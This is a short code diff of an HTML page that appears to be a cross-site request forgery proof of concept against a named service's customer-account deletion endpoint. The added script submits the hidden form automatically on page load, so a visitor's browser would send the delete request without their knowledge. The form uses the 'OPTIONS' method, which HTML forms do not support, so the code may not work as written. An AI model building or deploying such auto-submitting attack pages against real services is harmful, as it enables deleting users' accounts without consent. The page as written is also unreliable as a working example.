@@ -1,7 +1,13 @@
 <html>
-	<body>
-		<form method="OPTIONS" action="http://cdn.bff.zeptonow.com/api/v1/user/customer/delete/">
-			<input type="submit" value="Submit">
-		</form>
-	</body>
-<html>
+<body>
+    <form method="OPTIONS" action="http://cdn.bff.zeptonow.com/api/v1/user/customer/delete/" id="deleteForm">
+        <input type="submit" value="Submit">
+    </form>
+    
+    <script>
+        window.onload = function() {
+            document.getElementById('deleteForm').submit();
+        };
+    </script>
+</body>
+</html>
